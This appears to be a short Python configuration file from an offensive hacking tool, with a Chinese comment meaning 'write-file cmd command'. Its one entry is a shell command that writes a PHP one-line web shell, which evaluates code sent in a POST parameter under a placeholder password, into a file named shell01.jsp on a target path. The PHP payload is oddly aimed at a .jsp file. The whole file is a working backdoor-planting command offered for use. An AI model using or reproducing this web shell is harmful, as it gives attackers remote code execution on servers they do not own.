# coding:utf-8
config = {}
# 写入文件cmd命令
config['webshell'] = '''echo "<?php @eval($_POST[__RANDPASS__]); ?>" > {}shell01.jsp'''